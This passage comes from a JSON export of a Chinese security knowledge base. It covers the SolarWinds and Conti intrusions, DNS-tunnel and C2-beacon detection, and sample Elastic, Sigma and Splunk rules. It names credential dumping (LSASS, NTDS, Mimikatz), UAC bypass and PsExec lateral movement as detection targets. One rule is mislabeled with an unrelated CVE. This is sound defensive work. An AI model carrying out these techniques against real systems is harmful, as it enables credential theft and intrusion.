[https://mp.weixin.qq.com/s/AG-ITyHlwesxS2k-5BzgKg](https://mp.weixin.qq.com/s/AG-ITyHlwesxS2k-5BzgKg)\r\n- [https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/](https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[AWS 的 S3 故障回顾和思考]: ../行业观察/AWS/AWS 的 S3 故障回顾和思考.md \"AWS 的 S3 故障回顾和思考\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/实践参考/SolarWinds事件/","title":"SolarWinds事件"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SolarWinds事件\r\ntags:\r\n- 实践参考\r\n- SolarWinds\r\n---\r\n\r\n# 1. 背景\r\n\r\n2020 年，一场重大网络攻击渗透到全球数千个组织，包括美国联邦政府的多个部门，导致一系列数据泄露事件。据报道，由于目标的敏感性和高知名度以及持续时间长（八到九个月），网络攻击和数据泄露事件是美国有史以来遭受的最严重的网络间谍事件之一) 黑客可以访问的地方。在其被发现后的几天内，据报道全球至少有 200 个组织受到了攻击的影响，其中一些可能还遭受了数据泄露。全球受影响的组织包括北约、英国政府、欧洲议会、微软等。\r\n\r\n该攻击数月未被发现，于 2020 年 12 月 13 日首次公开报道，最初只知道影响了美国财政部和国家电信和信息管理局(NTIA)，部分美国商务部的。在接下来的几天里，更多的部门和私人组织报告了违规行为。\r\n\r\n![KWaNqM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/KWaNqM.jpg)\r\n\r\n# 2. SolarWinds 攻击的三个主要阶段\r\n\r\n**攻击阶段 1：入侵控制 Orion**\r\n\r\n- 虽然尚不清楚攻击者最初是如何入侵 SolarWinds Orion的，但据报道他们在发起攻击前，学习了很多该公司的代码结构和术语，对该公司非常了解；因此他们一旦进入内网便快速蔓延（对资源充足的攻击者来说，几乎总能找到进入内部的方法；这也是为什么我们需要[[Assume Breach]]）。\r\n- 为了在组织中站稳脚跟，攻击者入侵了 CI/CD 的pipeline（包括DevOps过程中的测试、打包、构建和签名），从而成功更改了 SolarWinds 的源代码。之后攻击者部署了“SunSpot”恶意软件，它以高权限运行，扫描 Orion 版本。\r\n\r\n**攻击阶段 2：瞄准 SolarWinds 客户**\r\n\r\n- 在大约两周的休眠期后（故意暂停帮助攻击者掩盖踪迹），恶意有效载荷开始进行一些侦察和操作安全检查（如果在环境中识别出此“清单”上的代理或工具，则恶意软件会尝试终止代理或自行挂起）。\r\n- 然而，如果恶意软件没有找到这些特定的哈希值，它就会进入下一个阶段：从 C&C 服务器分派命令并禁用任何易受攻击的终端agent。\r\n- 由于 Orion 作为受信任的第三方应用程序连接到客户的 Office 365 帐户，因此攻击者能够访问电子邮件和其他机密文档。\r\n\r\n**攻击阶段 3：向高价值目标提权**\r\n\r\n- 根据报道，攻击者很可能获取了存储在 Orion 数据库中的凭据，例如 Active Directory、防火墙、基础设施和网络管理软件等传统 Tier0 的资产。这将实现特权的快速升级。有了这些强大的凭据，攻击者就可以立即控制目标网络。\r\n\r\n# 3. Fireeye发布分析报告和检测规则\r\n\r\n2020 年 12 月 8 日，网络安全公司FireEye宣布红队工具被它认为是国家资助的攻击者窃取。FireEye 被认为是俄罗斯外国情报局SVR的目标。FireEye 表示，它在调查 FireEye 自身的漏洞和工具盗窃的过程中发现了 SolarWinds 供应链攻击。\r\n\r\n分析报告见\r\n\r\n- https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor\r\n\r\n公开检测规则见\r\n\r\n- https://github.com/mandiant/sunburst_countermeasures\r\n\r\n# 4. 转载：吐槽国内对SolarWinds事件的分析\r\n\r\n- 来源\r\n  - https://mp.weixin.qq.com/s/ytm62hJ59XIDi-QRlZTfEg\r\n- FireEye在自己的博客里面给了几个检测建议，我觉得非常好，做甲方安全的同胞们好好看看，是不是对待这种狂酷炫拽吊炸天的供应链，我们就完全没辙了么？其实还是有机会搞一搞的，就看你认不认真了。\r\n  - 攻击者的后门用的是合法的SolarWinds的数字签名，没辙。\r\n  - 攻击者的通信协议模仿的是SolarWinds的API调用，没辙。\r\n  - 从进程树上看来，就是SolarWinds进程的操作，没辙。\r\n  - 攻击者把他们的C2的hostname改成受害者环境里面的hostname，更容易迷惑处置人员。这个地方可以事后进行Hunting，没法事中进行检测。\r\n    **可以据此使用网络测绘数据进行Hunting。例如使用zoomeye 或者 shodan ，查看全网里面RDP的证书是否有你们公司的。如果有的话，确认下是否真实是你们公司的资产。如果不是，十有八九被用来干你们的。（此处需@heige）**\r\n  - 攻击者的C2 IP为了躲避检测，都用的跟受害公司同一个国家的VPS。如果攻击者使用C2 IP来访问被搞的账户，企业可以通过账户异常来检测到这个攻击。\r\n    **这个地方搞黑产的好像都是共识了，使用被攻击账户的同一个省市的拨号IP，连账号异常都很难触发。实际检测中要结合设备环境信息和账户操作习惯信息来更好的判定。**\r\n  - 攻击者通过获取的凭证进入网络后，他们会使用多个不同的账户凭证进行横向移动。用来横向移动的凭证不会和进入网络的账户凭证一致。避免横向移动被发现后，网络权限也被干掉了。\r\n    **这里可以通过检测是否有一个系统对多个系统使用多个不同账号进行批量登录尝试的行为。**\r\n  - 攻击者先把被控机器上合法的文件替换成他们的恶意文件，然后执行恶意文件，之后再把合法文件替换回去。例如，把你电脑上的notepad替换成他的恶意notepad，然后他执行下恶意notepad，执行完恶意notepad，再恢复到合法的notepad。\r\n    **这个地方做检测的人应该会很有感触，如果EDR的日志里面只记录了进程调用信息，但没记录进程的MD5，光看日志，是识别不出来这次的恶意操作的。当然，如果替换的恶意notepad本身做的事情比较明显，也会被告警。如果做的动作没那么大，这个告警百分百会被忽略掉。即使记录了进程MD5，处置人员很可能也会忽略。没有几个人想到还去对比下前后MD5是否一致。**\r\n    **这里FireEye给的建议是对这种短时间内创建执行删除再创建的行为进行告警。（敲黑板，这个地方其实是让大家在检测里面多增加一种异常行为维度）**\r\n  - 攻击者把原来合法的计划任务替换成他们要执行的文件，执行完再恢复到原始计划任务。\r\n    **这里FireEye给出的建议是监控这种临时的计划任务修改，通过频率分析来识别这种异常计划任务更改。**\r\n  - 上线使用DGA域名，这个地方大家可以深入看下。人工智能来解决安全问题前几年不是炒的很热么？检验你们成果的时刻到了。\r\n  - 攻击者通过先前获取的管理员权限进一步获取被攻击的组织的 可信SAML token签名证书，通过这个他们可以伪造成组织内任何一个高权限账户的SAML token（可以理解成搞定了一个accesskey的生成证书）。\r\n  - 使用这个可信的SAML token签名证书创建的SAML token，可以对信任该证书的任意云环境资源进行访问。因为该token是用他们的可信证书签名的，即使有告警，该异常也会被忽略（随意创建具备高权限的accesskey）。\r\n    **对待SAML token这种类似于云的api key，统统需要当成账户一样的资源来认认真真做下异常的“账户登录识别”，就是api key的使用异常识别（敲黑板）。**\r\n  - 通过上述方法搞定的高权限账户可以给已有的任意应用服务添加攻击者的凭证，这样他们就能直接访问这些应用服务了（通过该accesskey访问任意资源）。\r\n    **对添加凭证这种操作，要记录整个链路，谁通过什么方法，添加了一个怎样的key。这个操作是否异常。这样才能在响应的时候进行上下文关联。**\r\n\r\n# 5. 参考资料\r\n\r\n- [https://www.cyberark.com/resources/blog/the-anatomy-of-the-solarwinds-attack-chain](https://www.cyberark.com/resources/blog/the-anatomy-of-the-solarwinds-attack-chain)\r\n- [https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wbnr-unc2452-presentation-slides.pdf](https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wbnr-unc2452-presentation-slides.pdf)"},{"fields":{"slug":"/安全知识库/实践参考/勒索犯罪团伙Conti/","title":"勒索犯罪团伙Conti"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 勒索犯罪团伙Conti\r\ntags:\r\n- 实践参考\r\n- Conti\r\n---\r\n\r\n# 1. 背景\r\n\r\n- Conti是工业领域最活跃的勒索软件之一，Conti背后的团伙参与了很多系列的恶意软件开发。在2021年Conti这个团伙还干了一件让人不得不惧怕的事，那就是破坏了63家运营工业控制系统(ICS) 的公司，其中大部分是制造业。\r\n- 此外，Conti的势力还在不断扩大，它还控制了由TrickBot团伙开发的隐秘恶意软件BazarBackdoor，用于破坏高价值目标。就在前不久，Conti勒索软件团伙还接管了TrickBot恶意软件操作项目。\r\n- 名为“Conti Leaks ”的乌克兰安全研究人员泄露了6万多条关于Conti勒索软件操作的内部消息。据BleepingComputer报道，该研究人员为Conti团队的内部成员，因此可以访问Conti的XMPP聊天服务器的“ejabberd 数据库”后端。\r\n- 本次泄露的数据范围是在2021年1月21日至2022年2月27日区间，涉及393个的JSON文件、60,694条消息惨遭泄露。与此同时，泄露的消息中还包含了有关该团伙内部活动的各种信息，比如姓名、私人数据泄露URL、比特币地址以及有关其操作的讨论。\r\n- 泄露内容主要来自：[https://share.vx-underground.org/Conti/](https://share.vx-underground.org/Conti/)，里面有很多俄语看起来比较麻烦。\r\n\r\n# 2. Conti 内部软件 Leak.7z\r\n\r\n- 该文件夹包含 12 个 Conti 据称是内部软件的 git 存储库，大部分代码似乎都是 Conti 小组使用的开源软件。例如，yii2或Kohana被用作（似乎是）管理面板的一部分。代码大部分是用 PHP 编写的，由Composer管理，除了一个用 Go 编写的工具的存储库。\r\n\r\n# 3. Conti Rocket Chat Leaks.7z\r\n\r\n- 包含 Conti 成员的聊天记录，他们在其中讨论目标和通过 Cobalt Strike 执行攻击的一些技巧。\r\n  - Active Directory Enumeration\r\n  - SQL Databases Enumeration via sqlcmd。\r\n  - 如何访问 Shadow Protect SPX (StorageCraft)\r\n  - 如何创建 NTDS 转储与 vssadmin\r\n  - 如何打开新的 RDP 端口 1350\r\n- 工具包含\r\n  - Cobalt Strike\r\n  - Metasploit\r\n  - PowerView\r\n  - ShareFinder\r\n  - AnyDesk\r\n  - Mimikatz\r\n\r\n# 4. Conti 截图 2021.7z\r\n\r\n- ![k1za0w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/k1za0w.jpg)\r\n- 在一些泄露的屏幕截图中，可以看到 Conti 在 Kali Linux 中使用 Cobalt Strike。\r\n\r\n# 5. Conti Toolkit Leak.7z\r\n\r\n- 其中包含 APT TeamTNT 使用的工具，使用 shell/bash 脚本来针对各种操作系统以及 AWS 和 Kubernetes 的工具。\r\n\r\n# 6. Conti Trickbot 论坛 Leak.7z\r\n\r\n- 虽然大多数都包含关于如何横向移动以及如何使用 Trickbot 的说明，但还有一些有意思的东西，如：\r\n  - 一位成员分享了他的 webshell，标题为 “我使用的最轻、最耐用的 webshell”\r\n  - 使用了 ZeroLogon 等漏洞\r\n  - 使用诸如 Kerberoasting 之类的技术来执行他们的攻击\r\n  - 分享了一些代码来转储 MSSQL 凭据\r\n  - 一位用户分享了他的 PowerShell 脚本代码，用于在受害者的计算机上安装后门，包括安装 Tor、SSH 和设置防火墙规则\r\n\r\n# 7. Conti Trickbot Leaks.7z\r\n\r\n- 据称由“Sergey Loguntsov” https://github.com/loguntsov aka Begemot用 Erlang 编写的两个 Trickbot 服务器端组件。\r\n\r\n# 8. 培训材料\r\n\r\n- 包含 12 个具有不同主题的存档文件，包含\r\n  - 破解\r\n  - Metasploit\r\n  - 网络渗透测试\r\n  - Coblat strike\r\n  - 用于渗透测试者的 PowerShell\r\n  - Windows 红队\r\n  - WMI 攻击（和防御）\r\n  - SQL 服务器\r\n  - 活动目录\r\n  - 逆向工程\r\n\r\n# 9. 总结\r\n\r\n- 可以看出来他们也没有使用0day或者定制化工具（大部分和[[Lapsus$组织的手法]]一样都是使用常见的开源/商业化工具，小部分是自己开发的）\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[Lapsus$组织的手法]: Lapsus$组织的手法.md \"Lapsus$组织的手法\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/Blue Team能力建设/命令与控制 C2/DNS Tunnel隧道检测/","title":"DNS Tunnel隧道检测"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: DNS Tunnel隧道检测\r\ntags:\r\n- Blue Team能力建设\r\n- 命令与控制 C2\r\n- DNS\r\n---\r\n\r\n# 1. 阅读目录(Content)\r\n- DNS隧道简介\r\n  - DNS隧道木马分类\r\n    - IP直连型 DNS隧道木马\r\n    - 域名型 DNS隧道木马 - DNS迭代查询中继隧道\r\n    - IP直连型和域名解析型异同点\r\n- Powershell+dnscat2实现DNS隐蔽隧道反弹Shell\r\n  - C&C域名绑定\r\n  - 在C&C服务器上安装DNS C&C Server\r\n  - 部署客户端dnscat2 client\r\n  - 连接建立后，C&C控制端可以执行指令\r\n    - 获取shell\r\n    - 端口转发\r\n  - wireshark抓包分析\r\n    - UDP直连模式\r\n    - 域名解析模型\r\n- 可用于DNS tunnel的检测思路 - 基于UDP DNS会话\r\n  - DNS query type成分组成异常检测\r\n    - DNS Tunnel\r\n    - DNS FF Botnet\r\n    - DNS Query types Numbers\r\n  - 基于Zipf定律的异常检测 - Frequency Analysis\r\n  - DNS query/answer文本特征\r\n    - n-gram文本特征\r\n    - 基于CNN深度神经网络，从文本角度判断单条DNS query是否存在可疑Tunnel特征\r\n    - Query/Answer长度特征\r\n  - 基于会话聚类维度的DNS tunnel行为特征\r\n    - DNS会话时长\r\n    - DNS会话中数据包总数\r\n    - “上行大包”占请求报文总数的比例\r\n    - “下行小包”占响应报总数的比例\r\n    - 有效载荷的上传下载比\r\n    - 有效载荷部分是否加密\r\n    - 域名对应的主机名数量\r\n    - FQDN数异常检测\r\n    - 总的query 报文Payload载荷量\r\n  - 响应时间相关特征\r\n    - Response wait time特征\r\n  - 信息熵\r\n  - 发包频率行为\r\n- 可用于DNS tunnel的检测思路 - 基于DNS QUERY维度\r\n  - Network Features - 网络访问行为方面的特征\r\n    - 域名被访问频率角度特征\r\n    - TTL (last seen - first seen)\r\n    - window\r\n    - dns name change frequency\r\n  - Lexical Features\r\n    - 域名本身词频特征层面特征\r\n    - 域名的香侬熵\r\n    - 字符分布特征 -可读性/易读性方面的体现\r\n  - DNS session会话相关特征\r\n    - Number of IP subnetworks\r\n    - DNS对应的src_ip/dst_ip count相关特征\r\n    - DNS query type组成成分相关特征\r\n  - DNS域名相关meta信息\r\n    - whois-based features\r\n- 异常数据清洗\r\n  - 基线异常过滤思路\r\n  - 无监督异常abnormal检测算法\r\n\r\n# 2. 参考资料\r\n- [https://www.cnblogs.com/LittleHann/p/8656621.html](https://www.cnblogs.com/LittleHann/p/8656621.html)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/命令与控制 C2/基于统计学的C2流量检测/","title":"基于统计学的C2流量检测"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 基于统计学的C2流量检测\r\ntags:\r\n- Blue Team能力建设\r\n- 命令与控制 C2\r\n- 流量检测\r\n---\r\n\r\n# 1. 基础统计学知识\r\n- 中位数\r\n  - 中位数是想要表示一个数据集中间位置的数据。\r\n    - `比如一组数字 (1, 1, 2, 2, 4, 6, 9) 的中位数为 2`\r\n\r\n- 绝对中位差\r\n  - 中位数是想要表示一个数据集中间位置的数据，那么每个数据与中位数的差值，反映了这些数据偏离中间位置的程度，在这个偏离程度中取中位数得到的就是绝对中位差。\r\n\r\n    ```\r\n      比如一组数字 (1, 1, 2, 2, 4, 6, 9) 的中位数为 2\r\n      这组数字相对于2的偏差为：(1, 1, 0, 0, 2, 4, 7)，中位数为 1\r\n      所以绝对中位差为 1\r\n    ```\r\n\r\n- 偏度\r\n  - 衡量随机变量概率分布的不对称性，是相对于平均值不对称程度的度量，通过对偏度系数的测量，我们能够判定数据分布的不对称程度以及方向。\r\n  - ![fv5E4Y](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/fv5E4Y.jpg)\r\n  - 偏度的衡量是相对于正态分布来说，正态分布的偏度为0，即若数据分布是对称的，偏度为0。若偏度大于0，则分布右偏（正偏度），即分布有一条长尾在右；若偏度小于0，则分布为左偏（负偏度），即分布有一条长尾在左（如上图）；同时偏度的绝对值越大，说明分布的偏移程度越严重。\r\n\r\n# 2. C2流量vs正常流量\r\n假设beacon的配置为：\r\n| Sleep时间 | jitter | 实际sleep时间 |\r\n| --------- | ------ | ------------- |\r\n| 300s      | 20%    | 240s~360s     |\r\n\r\n\t- 访问的时间间隔为240s-360s\r\n\r\n假设正常用户随机浏览相同网页\r\n- 访问的时间间隔为60s-600s\r\n- 基于上述的假设和统计学知识，可以画出图：\r\n  - ![gQKyp4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/gQKyp4.jpg)\r\n- beacon中位数（Median）: 319\r\n- 正常用户中位数（Median）: 236\r\n- beacon绝对中位差（MAD）: 21\r\n- 正常用户绝对中位差（MAD）: 95\r\n\r\n可以得出结论：\r\n- **beacon：偏正态分布，绝对中位差比较小**\r\n- **正常用户：偏正/负偏度分布，绝对中位差比较大**\r\n\r\n参考RITA (Real Intelligence Threat Analytics)的算法，通过请求的时间间隔和数据包大小的统计信息，得出可疑的C2的请求:\r\n- 偏度\r\n- 绝对中位差\r\n- 频率\r\n\r\n实现的代码片段如下\r\n\r\n```go\r\n//计算偏度\r\n//store the diff slice length\r\ndiffLength := len(diff)\r\n\r\n//diffLength-1 is used since diff is a zero based slice\r\ntsLow := diff[util.Round(.25*float64(diffLength-1))]\r\ntsMid := diff[util.Round(.5*float64(diffLength-1))]\r\ntsHigh := diff[util.Round(.75*float64(diffLength-1))]\r\ntsBowleyNum := tsLow + tsHigh - 2*tsMid\r\ntsBowleyDen := tsHigh - tsLow\r\n\r\n//tsSkew should equal zero if the denominator equals zero\r\n//bowley skew is unreliable if Q2 = Q1 or Q2 = Q3\r\nif tsBowleyDen != 0 && tsMid != tsLow && tsMid != tsHigh {\r\n\ttsSkew = float64(tsBowleyNum) / float64(tsBowleyDen)\r\n}\r\n\r\n//计算绝对中位差\r\ntsMadm := devs[util.Round(.5*float64(diffLength-1))]\r\n\r\n//计算频率\r\nbucketDivs, freqList, freqCount, histScore := getTsHistogramScore(a.tsMin, a.tsMax, res.TsList)\r\n```\r\n\r\n# 3. 参考资料\r\n- [https://infosecjupyterthon.com/2021/sessions/day2-5-C2_Beaconing_Detection_using_Statistical_Analysis.html](https://infosecjupyterthon.com/2021/sessions/day2-5-C2_Beaconing_Detection_using_Statistical_Analysis.html)\r\n- [https://github.com/activecm/rita](https://github.com/activecm/rita)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/威胁检测规则/Elastic Rules/","title":"Elastic Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Elastic Rules\r\ntags:\r\n- Blue Team能力建设\r\n- 威胁检测规则\r\n- Elastic\r\n---\r\n\r\n# 1. 介绍\r\n内置100+检测规则可直接使用，如下图：\r\n![nDBkDF](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/nDBkDF.jpg)\r\n\r\n\r\n# 2. 案例\r\n检测计划任务（scheduled task）是否被创建\r\n\r\n- **Rule type**：EQL\r\n- **Rule indices**:\r\n  - winlogbeat-*\r\n  - logs-system.*\r\n- **Severity**：Low\r\n- **Risk score**：21\r\n- **Runs every**：5 min\r\n- **Searches indices from**：now-9m\r\n- **Maximum alerts per execution**：100\r\n- **References**：https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698\r\n- **Potential false positives**：安装新软件时，也可能触发创建合法的计划任务\r\n- 规则：\r\n\r\n```\r\niam where event.action == \"scheduled-task-created\" and /* excluding \r\ntasks created by the computer account */ not user.name : \"*$\" and\r\n/* TaskContent is not parsed, exclude by full taskname noisy ones */\r\nnot winlog.event_data.TaskName : (\"\\\\OneDrive Standalone\r\nUpdate Task-S-1-5-21*\", \"\\\\Hewlett-Packard\\\\HP Web\r\nProducts Detection\", \"\\\\Hewlett-Packard\\\\HPDeviceCheck\")\r\n```\r\n\r\n- **Framework**: MITRE ATT&CKTM\r\n  - Tactic:\r\n    - Name: Persistence\r\n    - ID: TA0003\r\n    - Reference URL: [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/)\r\n  - Technique:\r\n    - Name: Scheduled Task/Job\r\n    - ID: T1053\r\n    - Reference URL: [https://attack.mitre.org/techniques/T1053/](https://attack.mitre.org/techniques/T1053/)\r\n\r\n# 3. 参考资料\r\n- [https://www.elastic.co/guide/en/security/current/prebuilt-rules.html](https://www.elastic.co/guide/en/security/current/prebuilt-rules.html)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/威胁检测规则/SIGMA Rules/","title":"SIGMA Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SIGMA Rules\r\ntags:\r\n- Blue Team能力建设\r\n- 威胁检测规则\r\n- SIGMA\r\n---\r\n\r\n# 1. 介绍\r\n一种通用且开放的基于签名的规则格式，可以直接描述相关的日志事件。规则格式非常灵活，易于编写，适用于任何类型的日志文件。主要目的是提供一种结构化的形式，研究人员或分析人员可以在其中描述他们曾经开发的检测方法，并使其与他人共享。\r\n\r\nSigma支持主流的SIEM工具。它有以下优点：\r\n\r\n- 它使分析能够在组织之间重复使用和共享。\r\n- 高级通用分析语言\r\n- 解决记录签名问题等最可靠的方法\r\n- 纯文本YAML文件\r\n\r\n# 2. 相关Presentation\r\n[https://github.com/Neo23x0/Talks/blob/master/Sigma_Hall_of_Fame_20211022.pdf](https://github.com/Neo23x0/Talks/blob/master/Sigma_Hall_of_Fame_20211022.pdf)\r\n\r\n# 3. 举例：CVE-2009-3898的Sigma规则\r\n```\r\n  title: Suspicious PsExec Execution\r\n  id: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82\r\n  description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker\r\n      uses a different psexec client other than sysinternal one\r\n  author: Samir Bousseaden\r\n  date: 2019/04/03\r\n  references:\r\n      - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html\r\n  tags:\r\n      - attack.lateral_movement\r\n      - attack.t1077\r\n  logsource:\r\n      product: windows\r\n      service: security\r\n      description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\r\n  detection:\r\n      selection1:\r\n          EventID: 5145\r\n          ShareName: \\\\*\\IPC$\r\n          RelativeTargetName:\r\n           - '*-stdin'\r\n           - '*-stdout'\r\n           - '*-stderr'\r\n      selection2:\r\n          EventID: 5145\r\n          ShareName: \\\\*\\IPC$\r\n          RelativeTargetName: 'PSEXESVC*'\r\n      condition: selection1 and not selection2\r\n  falsepositives:\r\n      - nothing observed so far\r\n  level: high\r\n```\r\n\r\n# 4. 项目地址\r\n- [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/威胁检测规则/Splunk Rules/","title":"Splunk Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Splunk Rules\r\ntags:\r\n- Blue Team能力建设\r\n- 威胁检测规则\r\n- Splunk\r\n---\r\n\r\n# 1. 介绍\r\nSplunk提供映射到ATT&CK/KILL CHAIN/CIS Controls TTPs相关的USE CASE和检测规则， 它们包括检测规则、搜索语法、机器学习算法和 Splunk Phantom 剧本——所有这些都旨在协同工作以检测、调查和响应威胁。\r\n\r\n# 2. 覆盖范围\r\n要查看使用ATT&CK标记的所有内容的最新检测覆盖图，请访问：[https://mitremap.splunkresearch.com](https://mitremap.splunkresearch.com) 包含目前检测覆盖范围的技术的快照。 蓝色的阴影越深，对这种特定技术的检测就越多；该地图在每次发布时自动更新，并从 generate-coverage-map.py 生成。\r\n\r\n# 3. 检测规则\r\n包含了终端、网络和云相关的200多种检测规则，示例如下:\r\n\r\n```\r\n  name: Eventvwr UAC Bypass\r\n  id: 9cf8fe08-7ad8-11eb-9819-acde48001122\r\n  version: 1\r\n  date: '2021-03-01'\r\n  author: Michael Haag, Splunk\r\n  type: TTP\r\n  datamodel:\r\n  - Endpoint\r\n  description: The following search identifies Eventvwr bypass by identifying the registry\r\n    modification into a specific path that eventvwr.msc looks to (but is not valid)\r\n    upon execution. A successful attack will include a suspicious command to be executed\r\n    upon eventvwr.msc loading. Upon triage, review the parallel processes that have\r\n    executed. Identify any additional registry modifications on the endpoint that may\r\n    look suspicious. Remediate as necessary.\r\n  search: '| tstats `security_content_summariesonly` count values(Registry.registry_key_name)\r\n    as registry_key_name values(Registry.registry_path) as registry_path min(_time)\r\n    as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Registry where  Registry.registry_path=\"*mscfile\\\\shell\\\\open\\\\command\\\\*\"  by\r\n    Registry.user, Registry.dest , Registry.registry_value_name| `security_content_ctime(lastTime)`\r\n    | `security_content_ctime(firstTime)` | `drop_dm_object_name(Registry)` | `eventvwr_uac_bypass_filter`'\r\n  how_to_implement: To successfully implement this search you need to be ingesting information\r\n    on process that include the name of the process responsible for the changes from\r\n    your endpoints into the `Endpoint` datamodel in the `Registry` node.\r\n  known_false_positives: Some false positives may be present and will need to be filtered.\r\n  references:\r\n  - https://blog.malwarebytes.com/malwarebytes-news/2021/02/lazyscripter-from-empire-to-double-rat/\r\n  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md\r\n  - https://attack.mitre.org/techniques/T1548/002\r\n  - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\r\n  tags:\r\n    analytic_story:\r\n    - Windows Defense Evasion Tactics\r\n    - IcedID\r\n    automated_detection_testing: passed\r\n    confidence: 100\r\n    context:\r\n    - Source:Endpoint\r\n    - Stage:Defense Evasion\r\n    dataset:\r\n    - https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1548.002/atomic_red_team/windows-sysmon.log\r\n    impact: 80\r\n    kill_chain_phases:\r\n    - Exploitation\r\n    - Privilege Escalation\r\n    message: Registry values were modified to bypass UAC using Event Viewer on $dest$\r\n      by $user$.\r\n    mitre_attack_id:\r\n    - T1548.002\r\n    - T1548\r\n    observable:\r\n    - name: user\r\n      type: User\r\n      role:\r\n      - Victim\r\n    - name: dest\r\n      type: Hostname\r\n      role:\r\n      - Victim\r\n    product:\r\n    - Splunk Enterprise\r\n    - Splunk Enterprise Security\r\n    - Splunk Cloud\r\n    required_fields:\r\n    - _time\r\n    - Registry.registry_key_name\r\n    - Registry.registry_path\r\n    - Registry.user\r\n    - Registry.dest\r\n    - Registry.registry_value_name\r\n    risk_score: 80\r\n    security_domain: endpoint\r\n```\r\n\r\n完整内容见：\r\n  - [https://github.com/splunk/security_content/tree/develop/detections](https://github.com/splunk/security_content/tree/develop/detections)\r\n\r\n# 4. USE CASEs\r\n- ProxyShell的示例如下:\r\n\r\n  ```\r\n    name: ProxyShell\r\n    id: 413bb68e-04e2-11ec-a835-acde48001122\r\n    version: 1\r\n    date: '2021-08-24'\r\n    author: Michael Haag, Teoderick Contreras, Mauricio Velazco, Splunk\r\n    type: batch\r\n    description: ProxyShell is a chain of exploits targeting on-premise Microsoft Exchange Server - CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207.\r\n    narrative: 'During Pwn2Own April 2021, a security researcher demonstrated an attack chain targeting on-premise Microsoft Exchange Server. August 5th, the same researcher publicly released further details and demonstrated the attack chain. \\\r\n      1. CVE-2021-34473 - Pre-auth path confusion leads to ACL Bypass (Patched in April by KB5001779) \\\r\n      1. CVE-2021-34523 - Elevation of privilege on Exchange PowerShell backend (Patched in April by KB5001779) \\\r\n      1. CVE-2021-31207 - Post-auth Arbitrary-File-Write leads to RCE (Patched in May by KB5003435) \\\r\n      Upon successful exploitation, the remote attacker will have `SYSTEM` privileges on the Exchange Server. In addition to remote access/execution, the adversary may be able to run Exchange PowerShell Cmdlets to perform further actions.'\r\n    references:\r\n      - https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/\r\n      - https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\r\n      - https://www.youtube.com/watch?v=FC6iHw258RI\r\n      - https://www.huntress.com/blog/rapid-response-microsoft-exchange-servers-still-vulnerable-to-proxyshell-exploit#what-should-you-do\r\n      - https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf\r\n    tags:\r\n      analytic_story:\r\n      - ProxyShell\r\n      category:\r\n      - Adversary Tactics\r\n      - Ransomware\r\n      product:\r\n      - Splunk Enterprise\r\n      - Splunk Enterprise Security\r\n      - Splunk Cloud\r\n      usecase: Advanced Threat Detection\r\n  ```\r\n\r\n# 5. 攻击样本数据 Attack Data Repository\r\n- 无需准备攻击环境/工具， 快速验证检测规则的覆盖和有效性。\r\n- 数据使用YML，格式如下：\r\n\r\n| 字段        | 描述             |\r\n| ----------- | ---------------- |\r\n| id          | 唯一标识UUID     |\r\n| name        | 作者名称         |\r\n| date        | 最后修改日期     |\r\n| dataset     | dataset关联URLs  |\r\n| description | 简介             |\r\n| environment | 运行环境         |\r\n| technique   | 对应的ATT&CK手法 |\r\n| references  | 参考信息         |\r\n| sourcetypes | 来源类型         |\r\n\r\n示例如下:\r\n\r\n```\r\nid: 405d5889-16c7-42e3-8865-1485d7a5b2b6\r\nauthor: Patrick Bareiss\r\ndate: '2020-10-08'\r\ndescription: 'Atomic Test Results: Successful Execution of test T1003.001-1 Windows\r\nCredential Editor Successful Execution of test T1003.001-2 Dump LSASS.exe Memory\r\nusing ProcDump 